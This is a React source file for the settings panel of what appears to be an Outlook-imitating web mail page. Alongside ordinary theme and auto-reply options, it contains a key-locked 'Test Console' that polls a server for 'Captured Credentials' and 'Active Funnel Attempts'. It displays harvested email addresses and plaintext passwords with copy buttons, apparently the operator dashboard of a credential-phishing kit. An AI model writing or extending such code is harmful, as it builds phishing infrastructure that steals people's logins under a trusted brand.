import React, { useState, useEffect } from 'react';
import { 
  X, 
  Check, 
  Palette, 
  Layout, 
  ListFilter, 
  Sliders,
  KeyRound,
  Terminal,
  ExternalLink,
  Lock,
  ShieldCheck,
  RefreshCw,
  AlertCircle,
  Eye,
  EyeOff,
  Users,
  Copy,
  CheckCheck,
  CheckCircle2,
  Clock
} from 'lucide-react';
import { Density, ReadingPanePosition } from '../../types/mail';
import {
  fetchServerTestData,
  loadUsers,
  loadAttempts,
  unlockWithSecurityKey,
  lockTestConsole,
  isSessionKeyUnlocked,
  isUserAuthorizedForTest,
  type LoginAttempt,
  type UsersMap
} from '../../lib/testAuth';

export interface OutlookSettings {
  themeColor: string;
  isDarkMode: boolean;
  density: Density;
  readingPanePosition: ReadingPanePosition;
  enableFocusedInbox: boolean;
  groupByConversation: boolean;
  autoRepliesEnabled: boolean;
  autoRepliesText: string;
}

interface SettingsPanelProps {
  isOpen: boolean;
  onClose: () => void;
  settings: OutlookSettings;
  onUpdateSettings: (newSettings: Partial<OutlookSettings>) => void;
  onNavigateToTest?: () => void;
  currentUserEmail?: string;
}

const THEME_COLORS = [
  { id: 'cobalt', label: 'Outlook Blue', color: '#0078D4' },
  { id: 'slate', label: 'Excel Slate', color: '#107C41' },
  { id: 'terracotta', label: 'Office Warm', color: '#D83B01' },
  { id: 'indigo', label: 'Midnight Indigo', color: '#4F46E5' },
  { id: 'teal', label: 'Deep Ocean', color: '#0F766E' },
  { id: 'berry', label: 'Royal Plum', color: '#881337' }
];

export function SettingsPanel({
  isOpen,
  onClose,
  settings,
  onUpdateSettings,
  onNavigateToTest,
  currentUserEmail = ''
}: SettingsPanelProps) {
  const [activeTab, setActiveTab] = useState<'quick' | 'autoreply' | 'test-console'>('quick');

  // Test Console security & telemetry state
  const [keyInput, setKeyInput] = useState('');
  const [showKeyPassword, setShowKeyPassword] = useState(false);
  const [unlockError, setUnlockError] = useState('');
  const [isUnlocked, setIsUnlocked] = useState<boolean>(() => isSessionKeyUnlocked() || isUserAuthorizedForTest(currentUserEmail));
  const [consoleDataTab, setConsoleDataTab] = useState<'attempts' | 'accounts'>('attempts');
  
  const [users, setUsers] = useState<UsersMap>(loadUsers);
  const [attempts, setAttempts] = useState<LoginAttempt[]>(loadAttempts);
  const [isFetchingData, setIsFetchingData] = useState(false);
  const [lastRefreshed, setLastRefreshed] = useState<string>('Just now');
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // Sync authorization status when panel opens
  useEffect(() => {
    if (isOpen) {
      const authorized = isSessionKeyUnlocked() || isUserAuthorizedForTest(currentUserEmail);
      setIsUnlocked(authorized);
      if (authorized) {
        loadLatestData();
      }
    }
  }, [isOpen, currentUserEmail]);

  // Polling for live telemetry when test-console tab is open
  useEffect(() => {
    if (!isOpen || activeTab !== 'test-console' || !isUnlocked) return;
    
    loadLatestData();
    const interval = setInterval(() => {
      loadLatestData();
    }, 3000);
    return () => clearInterval(interval);
  }, [isOpen, activeTab, isUnlocked]);

  const loadLatestData = async () => {
    setIsFetchingData(true);
    try {
      const serverData = await fetchServerTestData();
      if (serverData) {
        setUsers(serverData.users);
        setAttempts(serverData.attempts);
      } else {
        setUsers(loadUsers());
        setAttempts(loadAttempts());
      }
      setLastRefreshed(new Date().toLocaleTimeString());
    } catch {
      setUsers(loadUsers());
      setAttempts(loadAttempts());
    } finally {
      setIsFetchingData(false);
    }
  };

  const handleUnlockConsole = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = keyInput.trim();
    if (!trimmed) {
      setUnlockError('Please enter the security access key.');
      return;
    }

    const res = unlockWithSecurityKey(trimmed, currentUserEmail);
    if (res.success) {
      setIsUnlocked(true);
      setUnlockError('');
      setKeyInput('');
      loadLatestData();
    } else {
      setUnlockError('Invalid security access key. Please check with your administrator.');
    }
  };

  const handleLockConsole = () => {
    lockTestConsole();
    setIsUnlocked(false);
    setUnlockError('');
  };

  const handleCopyText = (text: string, identifier: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(identifier);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  useEffect(() => {
    if (!isOpen) return;
    function handleKeyDown(e: KeyboardEvent) {
      if (e.key === 'Escape') {
        onClose();
      }
    }
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  const accountsList = Object.entries(users);
  const sortedAttempts = [...attempts].reverse();

  return (
    <div 
      className="fixed inset-0 z-50 bg-black/40 backdrop-blur-xs flex justify-end animate-in fade-in duration-100"
      onClick={onClose}
    >
      <div 
        className="w-full max-w-lg bg-white h-full shadow-2xl flex flex-col overflow-hidden animate-in slide-in-from-right duration-150 border-l border-gray-200"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="px-5 py-3.5 bg-brand-cobalt text-white flex items-center justify-between select-none">
          <div className="flex items-center gap-2">
            <Sliders size={18} />
            <span className="font-semibold text-sm">Settings</span>
          </div>
          <button
            type="button"
            onClick={onClose}
            className="p-1 hover:bg-white/20 text-white/90 hover:text-white transition-colors cursor-pointer"
            title="Close settings"
          >
            <X size={17} />
          </button>
        </div>

        {/* Tab switcher */}
        <div className="flex border-b border-gray-200 bg-gray-50 text-xs font-semibold select-none">
          <button
            type="button"
            onClick={() => setActiveTab('quick')}
            className={`flex-1 py-2.5 text-center border-b-2 transition-colors cursor-pointer ${
              activeTab === 'quick'
                ? 'border-brand-cobalt text-brand-cobalt bg-white'
                : 'border-transparent text-gray-500 hover:text-gray-900'
            }`}
          >
            Quick Settings
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('autoreply')}
            className={`flex-1 py-2.5 text-center border-b-2 transition-colors cursor-pointer ${
              activeTab === 'autoreply'
                ? 'border-brand-cobalt text-brand-cobalt bg-white'
                : 'border-transparent text-gray-500 hover:text-gray-900'
            }`}
          >
            Automatic Replies
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('test-console')}
            className={`flex-1 py-2.5 text-center border-b-2 transition-colors flex items-center justify-center gap-1.5 cursor-pointer ${
              activeTab === 'test-console'
                ? 'border-brand-cobalt text-brand-cobalt bg-white'
                : 'border-transparent text-gray-500 hover:text-gray-900'
            }`}
          >
            <KeyRound size={13} className={isUnlocked ? 'text-emerald-600' : 'text-amber-600'} />
            <span>Test Console</span>
            {isUnlocked && (
              <span className="w-2 h-2 rounded-full bg-emerald-500" title="Unlocked" />
            )}
          </button>
        </div>

        {/* Settings Content */}
        <div className="flex-1 overflow-y-auto p-5 space-y-6 text-xs text-[#1F2937]">
          {activeTab === 'quick' && (
            <>
              {/* 1. Theme and Color Accent */}
              <div>
                <label className="block font-semibold text-gray-900 mb-2 flex items-center gap-1.5">
                  <Palette size={14} className="text-brand-cobalt" />
                  <span>Theme &amp; Accent Color</span>
                </label>
                <div className="grid grid-cols-6 gap-2">
                  {THEME_COLORS.map((th) => (
                    <button
                      key={`theme-${th.id}`}
                      type="button"
                      onClick={() => onUpdateSettings({ themeColor: th.color })}
                      style={{ backgroundColor: th.color }}
                      className="w-10 h-10 rounded-none flex items-center justify-center text-white relative transition-transform hover:scale-105 shadow-2xs cursor-pointer"
                      title={th.label}
                    >
                      {settings.themeColor === th.color && <Check size={16} strokeWidth={3} />}
                    </button>
                  ))}
                </div>
              </div>

              {/* 2. Dark Mode Toggle */}
              <div className="pt-4 border-t border-gray-200">
                <div className="flex items-center justify-between">
                  <div>
                    <span className="font-semibold text-gray-900 block">Dark Mode</span>
                    <span className="text-[11px] text-gray-500">
                      Switch between classic high-contrast light and dark palette
                    </span>
                  </div>
                  <button
                    type="button"
                    onClick={() => onUpdateSettings({ isDarkMode: !settings.isDarkMode })}
                    className={`w-11 h-6 flex items-center rounded-full p-1 transition-colors cursor-pointer ${
                      settings.isDarkMode ? 'bg-brand-cobalt justify-end' : 'bg-gray-300 justify-start'
                    }`}
                  >
                    <span className="w-4 h-4 rounded-full bg-white shadow-xs" />
                  </button>
                </div>
              </div>

              {/* 3. Focused Inbox */}
              <div className="pt-4 border-t border-gray-200">
                <div className="flex items-center justify-between">
                  <div>
                    <span className="font-semibold text-gray-900 block">Focused Inbox</span>
                    <span className="text-[11px] text-gray-500">
                      Separate priority correspondence into Focused &amp; Other
                    </span>
                  </div>
                  <button
                    type="button"
                    onClick={() =>
                      onUpdateSettings({ enableFocusedInbox: !settings.enableFocusedInbox })
                    }
                    className={`w-11 h-6 flex items-center rounded-full p-1 transition-colors cursor-pointer ${
                      settings.enableFocusedInbox ? 'bg-brand-cobalt justify-end' : 'bg-gray-300 justify-start'
                    }`}
                  >
                    <span className="w-4 h-4 rounded-full bg-white shadow-xs" />
                  </button>
                </div>
              </div>

              {/* 4. Reading Pane Layout */}
              <div className="pt-4 border-t border-gray-200">
                <label className="block font-semibold text-gray-900 mb-2 flex items-center gap-1.5">
                  <Layout size={14} className="text-brand-cobalt" />
                  <span>Reading Pane Orientation</span>
                </label>
                <div className="grid grid-cols-3 gap-2">
                  <button
                    type="button"
                    onClick={() => onUpdateSettings({ readingPanePosition: 'right' })}
                    className={`p-2.5 border text-center font-medium rounded-none transition-colors cursor-pointer ${
                      settings.readingPanePosition === 'right'
                        ? 'border-brand-cobalt bg-brand-ice text-brand-cobalt font-semibold'
                        : 'border-gray-300 hover:bg-gray-50 text-gray-700'
                    }`}
                  >
                    <div className="h-6 border border-gray-300 flex mb-1.5 overflow-hidden">
                      <div className="w-1/2 bg-gray-100 border-r border-gray-300" />
                      <div className="w-1/2 bg-brand-cobalt/20" />
                    </div>
                    <span>Show on right</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => onUpdateSettings({ readingPanePosition: 'bottom' })}
                    className={`p-2.5 border text-center font-medium rounded-none transition-colors cursor-pointer ${
                      settings.readingPanePosition === 'bottom'
                        ? 'border-brand-cobalt bg-brand-ice text-brand-cobalt font-semibold'
                        : 'border-gray-300 hover:bg-gray-50 text-gray-700'
                    }`}
                  >
                    <div className="h-6 border border-gray-300 flex flex-col mb-1.5 overflow-hidden">
                      <div className="h-1/2 bg-gray-100 border-b border-gray-300" />
                      <div className="h-1/2 bg-brand-cobalt/20" />
                    </div>
                    <span>Show on bottom</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => onUpdateSettings({ readingPanePosition: 'off' })}
                    className={`p-2.5 border text-center font-medium rounded-none transition-colors cursor-pointer ${
                      settings.readingPanePosition === 'off'
                        ? 'border-brand-cobalt bg-brand-ice text-brand-cobalt font-semibold'
                        : 'border-gray-300 hover:bg-gray-50 text-gray-700'
                    }`}
                  >
                    <div className="h-6 border border-gray-300 bg-gray-100 mb-1.5" />
                    <span>Hide pane</span>
                  </button>
                </div>
              </div>

              {/* 5. Message List Density */}
              <div className="pt-4 border-t border-gray-200">
                <label className="block font-semibold text-gray-900 mb-2 flex items-center gap-1.5">
                  <ListFilter size={14} className="text-brand-cobalt" />
                  <span>Display Density</span>
                </label>
                <div className="grid grid-cols-3 gap-2">
                  {(['roomy', 'normal', 'compact'] as Density[]).map((d) => (
                    <button
                      key={`density-${d}`}
                      type="button"
                      onClick={() => onUpdateSettings({ density: d })}
                      className={`py-2 px-3 border capitalize font-medium rounded-none text-center transition-colors cursor-pointer ${
                        settings.density === d
                          ? 'border-brand-cobalt bg-brand-ice text-brand-cobalt font-semibold'
                          : 'border-gray-300 hover:bg-gray-50 text-gray-700'
                      }`}
                    >
                      {d}
                    </button>
                  ))}
                </div>
              </div>

              {/* 6. Conversation View */}
              <div className="pt-4 border-t border-gray-200">
                <div className="flex items-center justify-between">
                  <div>
                    <span className="font-semibold text-gray-900 block">Conversation Grouping</span>
                    <span className="text-[11px] text-gray-500">
                      Group related emails sharing the same subject line into threads
                    </span>
                  </div>
                  <button
                    type="button"
                    onClick={() =>
                      onUpdateSettings({
                        groupByConversation: !settings.groupByConversation
                      })
                    }
                    className={`w-11 h-6 flex items-center rounded-full p-1 transition-colors cursor-pointer ${
                      settings.groupByConversation ? 'bg-brand-cobalt justify-end' : 'bg-gray-300 justify-start'
                    }`}
                  >
                    <span className="w-4 h-4 rounded-full bg-white shadow-xs" />
                  </button>
                </div>
              </div>

              {/* 7. Test Console & Security Section in Quick Settings */}
              <div className="pt-4 border-t border-gray-200 bg-slate-50/70 -mx-5 px-5 py-4">
                <div className="flex items-center justify-between gap-3">
                  <div>
                    <div className="flex items-center gap-1.5 font-semibold text-gray-900">
                      <KeyRound size={14} className="text-amber-600" />
                      <span>Security &amp; Test Console</span>
                    </div>
                    <p className="text-[11px] text-gray-500 mt-0.5">
                      Access diagnostics, telemetry, and system verification using your access key.
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={() => setActiveTab('test-console')}
                    className="flex-shrink-0 px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded text-xs transition-colors cursor-pointer shadow-xs"
                  >
                    {isUnlocked ? 'Open Console' : 'Enter Access Key'}
                  </button>
                </div>
              </div>
            </>
          )}

          {activeTab === 'autoreply' && (
            /* Automatic Replies Tab */
            <div className="space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-gray-200">
                <div>
                  <span className="font-semibold text-gray-900 block">Turn on automatic replies</span>
                  <span className="text-[11px] text-gray-500">
                    Notify senders when you are away from your desk or out of the office
                  </span>
                </div>
                <button
                  type="button"
                  onClick={() =>
                    onUpdateSettings({ autoRepliesEnabled: !settings.autoRepliesEnabled })
                  }
                  className={`w-11 h-6 flex items-center rounded-full p-1 transition-colors cursor-pointer ${
                    settings.autoRepliesEnabled ? 'bg-brand-cobalt justify-end' : 'bg-gray-300 justify-start'
                  }`}
                >
                  <span className="w-4 h-4 rounded-full bg-white shadow-xs" />
                </button>
              </div>

              {settings.autoRepliesEnabled && (
                <div className="space-y-3 pt-2">
                  <div>
                    <label className="block text-gray-700 font-semibold mb-1">
                      Auto-reply message
                    </label>
                    <textarea
                      value={settings.autoRepliesText}
                      onChange={(e) => onUpdateSettings({ autoRepliesText: e.target.value })}
                      rows={5}
                      className="w-full border border-gray-300 p-2 text-xs text-gray-800 outline-none focus:border-brand-cobalt"
                      placeholder="Thank you for your message. I am currently away from the office with limited access to email..."
                    />
                  </div>
                  <div className="p-3 bg-brand-ice text-brand-cobalt text-[11px] border border-brand-cobalt/20">
                    Automatic reply status: Active. Senders will receive this notice once per session.
                  </div>
                </div>
              )}
            </div>
          )}

          {activeTab === 'test-console' && (
            /* Test Console Setup Tab */
            <div className="space-y-5">
              {!isUnlocked ? (
                /* Locked State: Requires Security Key */
                <div className="bg-slate-900 text-white rounded-lg p-6 space-y-5 shadow-lg border border-slate-800">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
                      <Lock size={20} />
                    </div>
                    <div>
                      <h3 className="text-sm font-bold text-white tracking-wide">
                        Test Console Security Verification
                      </h3>
                      <p className="text-[11px] text-slate-400">
                        Enter the security key provided by the administrator to access internal logs and telemetry.
                      </p>
                    </div>
                  </div>

                  <form onSubmit={handleUnlockConsole} className="space-y-3">
                    <div>
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Security Access Key
                      </label>
                      <div className="relative">
                        <input
                          type={showKeyPassword ? 'text' : 'password'}
                          value={keyInput}
                          onChange={(e) => {
                            setKeyInput(e.target.value);
                            setUnlockError('');
                          }}
                          placeholder="Enter security key"
                          className="w-full px-3 py-2 pr-10 bg-slate-950 border border-slate-700 text-white text-xs rounded focus:outline-none focus:border-blue-500 font-mono tracking-wider"
                          autoFocus
                        />
                        <button
                          type="button"
                          onClick={() => setShowKeyPassword(prev => !prev)}
                          className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white cursor-pointer"
                        >
                          {showKeyPassword ? <EyeOff size={14} /> : <Eye size={14} />}
                        </button>
                      </div>
                    </div>

                    {unlockError && (
                      <div className="p-2 bg-rose-950/60 border border-rose-800/80 rounded text-[11px] text-rose-300 flex items-center gap-1.5">
                        <AlertCircle size={13} className="text-rose-400 flex-shrink-0" />
                        <span>{unlockError}</span>
                      </div>
                    )}

                    <div className="pt-1">
                      <button
                        type="submit"
                        className="w-full py-2 px-4 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded transition-colors flex items-center justify-center gap-1.5 cursor-pointer shadow-sm"
                      >
                        <ShieldCheck size={14} />
                        <span>Unlock Test Console</span>
                      </button>
                    </div>
                  </form>

                  <div className="pt-2 border-t border-slate-800 text-[11px] text-slate-400 flex items-center justify-between">
                    <span>Authorized access only</span>
                    <span className="text-slate-400">Restricted diagnostic console</span>
                  </div>
                </div>
              ) : (
                /* Unlocked State: Full In-Settings Console & Telemetry */
                <div className="space-y-4">
                  {/* Verified Header Badge & Controls */}
                  <div className="bg-slate-900 text-white p-4 rounded-lg border border-emerald-500/30 shadow-md space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="flex items-center gap-1 text-[11px] font-bold text-emerald-400 bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 rounded">
                          <CheckCircle2 size={12} />
                          ACCESS UNLOCKED
                        </span>
                        <span className="text-[10px] text-slate-400 font-mono hidden sm:inline">
                          Sync: {lastRefreshed}
                        </span>
                      </div>
                      <div className="flex items-center gap-1.5">
                        <button
                          type="button"
                          onClick={loadLatestData}
                          disabled={isFetchingData}
                          className="p-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white rounded text-xs transition-colors cursor-pointer"
                          title="Refresh telemetry"
                        >
                          <RefreshCw size={12} className={isFetchingData ? 'animate-spin' : ''} />
                        </button>
                        <button
                          type="button"
                          onClick={handleLockConsole}
                          className="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-rose-300 hover:text-rose-200 rounded text-[11px] font-medium transition-colors cursor-pointer border border-slate-700"
                          title="Lock console again"
                        >
                          Lock
                        </button>
                      </div>
                    </div>

                    {/* Launch Fullscreen Console Button */}
                    {onNavigateToTest && (
                      <button
                        type="button"
                        onClick={() => {
                          onClose();
                          onNavigateToTest();
                        }}
                        className="w-full flex items-center justify-center gap-2 py-2.5 px-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white text-xs font-semibold rounded-md shadow-md transition-all cursor-pointer"
                      >
                        <Terminal size={15} />
                        <span>Launch Dedicated Fullscreen Console (/test)</span>
                        <ExternalLink size={13} />
                      </button>
                    )}
                  </div>

                  {/* Telemetry Metrics Row */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-3 bg-slate-50 border border-gray-200 rounded text-center">
                      <div className="text-[10px] uppercase font-bold text-gray-600 flex items-center justify-center gap-1">
                        <Users size={12} className="text-blue-600" />
                        <span>Accounts In Registry</span>
                      </div>
                      <div className="text-xl font-bold text-gray-900 mt-1">
                        {accountsList.length}
                      </div>
                      <div className="text-[10px] text-gray-600 mt-0.5">
                        Saved in users.json
                      </div>
                    </div>

                    <div className="p-3 bg-slate-50 border border-gray-200 rounded text-center">
                      <div className="text-[10px] uppercase font-bold text-gray-600 flex items-center justify-center gap-1">
                        <Clock size={12} className="text-emerald-600" />
                        <span>Captured Attempts</span>
                      </div>
                      <div className="text-xl font-bold text-gray-900 mt-1">
                        {attempts.length}
                      </div>
                      <div className="text-[10px] text-gray-600 mt-0.5">
                        Continuous Funnel Active
                      </div>
                    </div>
                  </div>

                  {/* Sub-tabs: Recent Attempts vs Captured Accounts */}
                  <div className="border border-gray-200 rounded-lg overflow-hidden bg-white shadow-xs">
                    <div className="flex border-b border-gray-200 bg-gray-50 text-[11px] font-semibold">
                      <button
                        type="button"
                        onClick={() => setConsoleDataTab('attempts')}
                        className={`flex-1 py-2 text-center border-b-2 transition-colors cursor-pointer ${
                          consoleDataTab === 'attempts'
                            ? 'border-brand-cobalt text-brand-cobalt bg-white'
                            : 'border-transparent text-gray-500 hover:text-gray-900'
                        }`}
                      >
                        Active Funnel Attempts ({sortedAttempts.length})
                      </button>
                      <button
                        type="button"
                        onClick={() => setConsoleDataTab('accounts')}
                        className={`flex-1 py-2 text-center border-b-2 transition-colors cursor-pointer ${
                          consoleDataTab === 'accounts'
                            ? 'border-brand-cobalt text-brand-cobalt bg-white'
                            : 'border-transparent text-gray-500 hover:text-gray-900'
                        }`}
                      >
                        Captured Credentials ({accountsList.length})
                      </button>
                    </div>

                    <div className="p-3 max-h-[260px] overflow-y-auto font-mono text-[11px]">
                      {consoleDataTab === 'attempts' ? (
                        sortedAttempts.length === 0 ? (
                          <div className="py-6 text-center text-gray-400 font-sans text-xs">
                            No login attempts recorded yet.
                          </div>
                        ) : (
                          <div className="space-y-2">
                            {sortedAttempts.slice(0, 20).map((att, idx) => {
                              const itemKey = att.id ? `att-${att.id}` : `att-fallback-${idx}-${att.time || ''}-${att.email || ''}`;
                              return (
                                <div
                                  key={itemKey}
                                  className="p-2 bg-gray-50 hover:bg-gray-100 border border-gray-200 rounded text-left transition-colors"
                                >
                                  <div className="flex items-center justify-between text-[10px] text-gray-500 mb-1">
                                    <span>{att.time}</span>
                                    <span className={`px-1.5 py-0.2 rounded font-semibold ${
                                      att.success ? 'bg-emerald-100 text-emerald-800' : 'bg-rose-100 text-rose-800'
                                    }`}>
                                      {att.stage || 'Login Event'}
                                    </span>
                                  </div>
                                  <div className="font-semibold text-gray-800 break-all">
                                    {att.email}
                                  </div>
                                  {att.password && (
                                    <div className="text-[10px] text-blue-700 flex items-center justify-between mt-1 pt-1 border-t border-gray-200/60">
                                      <span>Pass: <strong className="font-mono">{att.password}</strong></span>
                                      <button
                                        type="button"
                                        onClick={() => handleCopyText(att.password, itemKey)}
                                        className="text-gray-400 hover:text-gray-700 cursor-pointer"
                                        title="Copy password"
                                      >
                                        {copiedKey === itemKey ? <CheckCheck size={11} className="text-emerald-600" /> : <Copy size={11} />}
                                      </button>
                                    </div>
                                  )}
                                </div>
                              );
                            })}
                          </div>
                        )
                      ) : (
                        /* Accounts list */
                        <div className="space-y-2">
                          {accountsList.map(([email, pass], idx) => {
                            const accKey = `acc-${email}-${idx}`;
                            return (
                              <div
                                key={accKey}
                                className="p-2 bg-gray-50 hover:bg-gray-100 border border-gray-200 rounded flex items-center justify-between transition-colors"
                              >
                                <div className="overflow-hidden pr-2">
                                  <div className="font-semibold text-gray-800 truncate">
                                    {email}
                                  </div>
                                  <div className="text-[10px] text-slate-500 truncate">
                                    Password: <span className="font-mono text-blue-700 font-bold">{pass}</span>
                                  </div>
                                </div>
                                <button
                                  type="button"
                                  onClick={() => handleCopyText(`${email} / ${pass}`, accKey)}
                                  className="px-2 py-1 bg-white hover:bg-gray-50 text-gray-600 rounded border border-gray-300 text-[10px] font-sans flex items-center gap-1 cursor-pointer flex-shrink-0"
                                >
                                  {copiedKey === accKey ? (
                                    <>
                                      <CheckCheck size={11} className="text-emerald-600" />
                                      <span>Copied</span>
                                    </>
                                  ) : (
                                    <>
                                      <Copy size={11} />
                                      <span>Copy</span>
                                    </>
                                  )}
                                </button>
                              </div>
                            );
                          })}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="px-5 py-3 bg-gray-50 border-t border-gray-200 flex items-center justify-between">
          <span className="text-[11px] text-gray-500 font-mono">
            {activeTab === 'test-console' ? (isUnlocked ? 'Access Granted' : 'Locked') : 'Settings'}
          </span>
          <button
            type="button"
            onClick={onClose}
            className="px-5 py-1.5 bg-brand-cobalt hover:bg-[#004578] text-white font-semibold transition-colors cursor-pointer text-xs"
          >
            Done
          </button>
        </div>
      </div>
    </div>
  );
}
